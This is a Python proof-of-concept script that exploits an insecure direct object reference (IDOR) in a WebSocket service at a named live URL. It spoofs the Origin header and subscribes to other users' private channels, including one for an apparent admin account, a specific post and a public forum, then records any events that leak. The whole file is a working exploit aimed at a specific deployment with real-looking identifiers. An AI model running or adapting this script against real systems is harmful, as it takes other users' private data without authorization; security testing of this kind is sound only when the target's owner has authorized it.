#!/usr/bin/env python3
"""
Test: Confirm WebSocket user channel IDOR with event triggering.
We need to actually trigger an event to see if it leaks.
"""
import json
import time
import threading
import websocket

WS_URL = "wss://towers-pest-kelly-skins.trycloudflare.com/ws/"
REAL_USER_ID = "d0cfb9b0-d569-49f4-9f37-8383eccd5ff6"  # testuser from API
ADMIN_USER = "nikithamal"


def listener_thread(user_id, results, stop_event):
    """Listen on the user channel for events"""
    ws = websocket.create_connection(
        WS_URL, origin="https://nebians.consica.com.np", timeout=15
    )
    ready = ws.recv()
    results.append(f"[Listener-{user_id}] Ready: {ready[:80]}")

    ws.send(json.dumps({"action": "subscribe", "channel": f"user.{user_id}"}))
    sub = ws.recv()
    results.append(f"[Listener-{user_id}] Subscribe: {sub}")

    ws.settimeout(2)
    while not stop_event.is_set():
        try:
            msg = ws.recv()
            if msg and "subscribed" not in msg and "pong" not in msg:
                results.append(f"[Listener-{user_id}] EVENT: {msg[:500]}")
        except Exception:
            pass

    ws.close()


def listener_post(post_id, results, stop_event):
    """Listen on the post channel for events"""
    ws = websocket.create_connection(
        WS_URL, origin="https://nebians.consica.com.np", timeout=15
    )
    ready = ws.recv()
    results.append(f"[Post-{post_id[:8]}] Ready: {ready[:80]}")

    ws.send(json.dumps({"action": "subscribe", "channel": f"post.{post_id}"}))
    sub = ws.recv()
    results.append(f"[Post-{post_id[:8]}] Subscribe: {sub}")

    ws.settimeout(2)
    while not stop_event.is_set():
        try:
            msg = ws.recv()
            if msg and "subscribed" not in msg and "pong" not in msg:
                results.append(f"[Post-{post_id[:8]}] EVENT: {msg[:500]}")
        except Exception:
            pass

    ws.close()


def listener_forum(results, stop_event):
    """Listen on forum.public for events"""
    ws = websocket.create_connection(
        WS_URL, origin="https://nebians.consica.com.np", timeout=15
    )
    ready = ws.recv()
    results.append(f"[Forum] Ready: {ready[:80]}")

    ws.send(json.dumps({"action": "subscribe", "channel": "forum.public"}))
    sub = ws.recv()
    results.append(f"[Forum] Subscribe: {sub}")

    ws.settimeout(2)
    while not stop_event.is_set():
        try:
            msg = ws.recv()
            if msg and "subscribed" not in msg and "pong" not in msg:
                results.append(f"[Forum] EVENT: {msg[:500]}")
        except Exception:
            pass

    ws.close()


def main():
    results = []
    stop_event = threading.Event()

    # Spin up multiple listeners
    threads = [
        threading.Thread(target=listener_thread, args=(REAL_USER_ID, results, stop_event)),
        threading.Thread(target=listener_thread, args=(ADMIN_USER, results, stop_event)),
        threading.Thread(target=listener_post, args=("b5833249-6585-4caa-84fa-a0d599f0cfc5", results, stop_event)),
        threading.Thread(target=listener_forum, args=(results, stop_event)),
    ]

    for t in threads:
        t.start()
        time.sleep(0.2)

    # Now wait some time for any events
    print("[*] Listening for events for 10 seconds...")
    time.sleep(10)

    stop_event.set()
    for t in threads:
        t.join(timeout=5)

    print("\n" + "=" * 60)
    print("Captured events/messages:")
    print("=" * 60)
    for r in results:
        print(r)


if __name__ == "__main__":
    main()
